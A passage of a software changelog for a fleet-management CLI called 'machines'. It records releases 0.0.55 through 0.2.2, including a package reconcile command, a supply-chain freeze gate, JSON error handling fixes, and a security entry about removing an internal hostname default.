  `BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX` /
  `BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE` (`src/browserplan.ts`). A test
  pins `BROWSERPLAN_APP_ID === defaultAppIdForPackage(BROWSERPLAN_PACKAGE_NAME)`
  and `BROWSERPLAN_ROUTE_OWNER === defaultAppIdForPackage(MACHINES_PACKAGE_NAME)`
  so the ids stay derived from the package names that define them. Emitted
  values are unchanged.
- Added `bun run schema:generate`
  (`scripts/generate-consumer-schema.ts`) to regenerate
  `schemas/machines-consumer.schema.json` from
  `MACHINES_CONSUMER_SCHEMA_BUNDLE`; the artifact is no longer hand-edited, and
  `test/consumer.test.ts` now asserts byte identity rather than only deep
  equality.

## [0.2.2] - 2026-07-24

### Fixed

- Fixed a `tsc` type-check/declaration-emit failure (TS2352) in
  `reportTopLevelError` (`src/cli/index.ts`): the Commander `exitCode` is now
  read via a single narrowing read instead of an invalid `Error -> { exitCode:
number }` cast, so `bun run build` / `verify:release` succeed. The emitted
  runtime JS is unchanged.
- Replaced the unresolvable `@hasna/mcp-harness` dependency pin
  (`file:../open-mcp`) with the published registry range (`^0.1.0`). This clears
  the `TS2307: Cannot find module '@hasna/mcp-harness'` error in
  `src/mcp/http.ts` (and its MCP smoke test) on clean checkouts and CI, where no
  `../open-mcp` sibling exists. API surface used (`healthPayload`, `isHttpMode`,
  `resolveMcpHttpPort`) is present in `@hasna/mcp-harness@0.1.0`.

## [0.2.1] - 2026-07-24

### Security

- Removed the shipped internal-infra hostname default from the fleet-flip /
  cloud-transport code, the `distribute-cloud-keys` script, docs, and the JSON
  Schema `$id`. The per-app self-hosted API URL default is now built from
  `HASNA_FLEET_API_DOMAIN` (REQUIRED for a real deployment) and otherwise
  falls back to a neutral, non-resolving placeholder domain
  (`your-deployment.example`) instead of a real internal hostname.
  `MACHINES_CONSUMER_SCHEMA_URI` now uses the neutral `schemas.example.com`
  placeholder (identifier string only; never fetched). Also redacted a real AWS
  account ID + RDS instance identifier from `docs/FLEET-FLIP.md`. Any real
  `machines flip` run must now set `HASNA_FLEET_API_DOMAIN` (or explicit per-app
  `HASNA_<APP>_API_URL`). (#17)

## [0.2.0] - 2026-07-24

### Added

- Added `machines reconcile`: desired-state package reconcile for
  machines-agent. Plans and executes `bun install -g pkg@version` against the
  manifest, verifies CLI `--version` (and declared `hasna-*-mcp` health
  endpoints), rolls back to the prior version on verification failure, and
  emits `hasna.rollout_record.v1` events (`release.rollout.started/completed/
failed`, `app.installed`) through the `@hasna/events` envelope. Dry-run by
  default; `--apply` requires scoped mutation approval. Triggerable from a
  `release.published` event via `--event-json` or `reconcileFromReleaseEvent`.
- Added `machines freeze add|remove|list|check`: supply-chain freeze gate that
  blocks reconcile installs/updates of frozen packages (ported from the
  skill-package-update incident-freeze rule), with optional `--until` expiry
  and manifest-declared fleet-wide freeze entries.
- Extended the `machines.json` schema (backward compatible): fleet-wide
  `packages` desired-state list, `freeze` list, and per-package `appId`,
  `bin`, `verify`, and `mcpHealthUrl` fields aligned with the distribution
  contracts. `verify: false` marks library-only packages without a CLI so
  reconcile skips the `<bin> --version` check instead of flapping through
  verify-fail/rollback cycles.

### Fixed

- Closed a freeze-gate bypass for programmatic callers: `buildReconcilePlan`
  (and `reconcileFromReleaseEvent`) with an in-memory `manifest` now merge the
  on-disk `freeze.json` entries (`machines freeze add`) with the manifest's
  freeze list instead of skipping the disk gate entirely.
- Made the consumer conformance fixture hermetic: "SDK absent" cases now
  install an always-failing tombstone package so ambient `node_modules`
  directories above the temp app (for example `/tmp/node_modules`) cannot leak
  a real `@hasna/machines` into resolution.

## [0.1.6] - 2026-07-24

### Fixed

- `machines heartbeat collector-command` no longer bakes the deprecated
  `--fail-on-error` flag into the canonical/blessed OpenLoops collector
  command. `heartbeat collect` now always exits non-zero on any failed
  import, so failure detection in the trusted loop no longer depends on the
  flag; `--fail-on-error` is a deprecated no-op retained for backwards
  compatibility (help text and README updated to match). (#21)

## [0.1.5] - 2026-07-24

### Fixed

- `machines manifest` subcommands (`init`, `path`, `list`, `validate`,
  `bootstrap`, `get`, `remove`, `add`) now accept the standard `-j/--json`
  flag instead of hard-failing with `error: unknown option '--json'`, so
  uniform `--json` tooling no longer breaks on the manifest command group.
  (#19)
- `machines screen-credentials --all --json` no longer exits non-zero when a
  discovered machine is unroutable: a listing that returns data for at least
  one machine now succeeds, unroutable machines are surfaced per-entry, and a
  new `--strict` flag restores full fail-closed behaviour. (#18)
- CLI error and usage-validation paths now emit structured
  `{ ok: false, error, code }` under `-j/--json` (screen-credentials with
  neither `--machine` nor `--all`; `workspace resolve`/`workspace doctor`
  missing `--machine`; `backup` with no resolvable S3 bucket; `db migrate`
  in cloud mode with no database URL) instead of writing plain text or
  Commander's default usage errors that broke JSON consumers. (#20)
- `machines ops db-integrity` now bounds total quick_check work with an
  effective time budget (default 20s, `--max-total-ms`), reporting remaining
  databases as `skipped_budget` instead of hanging past the deadline on
  stations with hundreds of SQLite files. (#22)

### Note

- Version reconciliation: this release restores the committed version line to
  match the published npm `latest`. Versions `0.1.0`–`0.1.4` were published to
  npm from the `main` line on 2026-07-08 but the accompanying `package.json`
  bumps, CHANGELOG entries, and git tags were never committed back. The
  `[0.1.0]`–`[0.1.4]` entries below are backfilled from the merged feature
  commits; `0.1.5` is the first release cut with fully committed provenance.

## [0.1.4] - 2026-07-08

### Added

- Cloud machine registry CRUD routes to the hosted control plane
  (`/v1/machines`) when running in `self_hosted` mode, so registry reads and
  writes go through the shared control plane rather than local-only state.
  (#15)

## [0.1.3] - 2026-07-08

### Fixed

- Fleet env-flip API client operates correctly in `self_hosted` mode across
  all 25 apps, with atomic `--all-machines` application. (#14)

## [0.1.2] - 2026-07-08

_Published from the `main` line on 2026-07-08 as part of the self-host / fleet
control-plane rollout. No standalone changelog entry was recorded at publish
time; the feature set is captured under `[0.1.0]`–`[0.1.4]`._

## [0.1.1] - 2026-07-08

_Published from the `main` line on 2026-07-08 as part of the self-host / fleet
control-plane rollout. No standalone changelog entry was recorded at publish
time; the feature set is captured under `[0.1.0]`–`[0.1.4]`._

## [0.1.0] - 2026-07-08

### Added

- Self-host machines control plane: `machines serve /v1`, the machines SDK,
  cloud runtime storage, and deploy support, enabling a `self_hosted`
  deployment of the machine fleet control plane. (#13)
- Fleet env-flip mechanism to move machines between `local` and `cloud`
  runtime modes with canary rollout. (#9)

### Changed

- Documented the interim per-machine RDS tunnel rollout step and the verifier
  contract note for the fleet flip. (#11)

## [0.0.63] - 2026-07-04

### Added

- Added `machines heartbeat collector-command` to emit the package-owned
  OpenLoops heartbeat collector command instead of relying on ad hoc scheduled
  shell snippets.
- Added `machines heartbeat collect --fail-on-error` so scheduled collector
  runs fail when any selected heartbeat import fails.

### Changed

- Documented that one-minute OpenLoops heartbeat collectors must use explicit
  low-latency targets and must not schedule `machines topology --all --json`,
  which only reads stale topology rows.

### Added

- Root open-source release policy files: `SECURITY.md`, `CONTRIBUTING.md`, and
  `CODE_OF_CONDUCT.md`.

### Changed

- Release verification now uses Bun package-manager commands instead of
  requiring `npm` on PATH.

## [0.0.58] - 2026-06-27

### Added

- Added loop-ready `machines ops db-integrity` and
  `machines ops state-snapshot` commands for bounded SQLite integrity checks,
  verified ops-state snapshots, private JSON evidence, and deduped todos task
  upserts.
- Added regression coverage for WAL-mode snapshot safety, sqlite3 missing
  fail-closed behavior, bounded truncation output, private report/snapshot
  permissions, retention safety, and task-upsert idempotency.

### Fixed

- Collapsed missing sqlite3 into one dependency-level task suggestion, capped
  default machine-data task creation, and fixed snapshot paths containing
  apostrophes.

## [0.0.55] - 2026-06-27

### Added

- `machines ops check` can now opt into safe deduped todos task creation with
  `--upsert-tasks --todos-project <path>` while preserving the default
  read-only diagnostics behavior.
- Added SDK exports for argv-safe Fleet Ops task upserts so deterministic loops
  can route machine/topology/tmux findings through tasks instead of tmux panes.

## Earlier Releases

Versions `0.0.1` through `0.0.54` were published before this root changelog was
introduced. Use the git history and npm registry metadata for release timing,
package provenance, and release-specific change details for those versions.
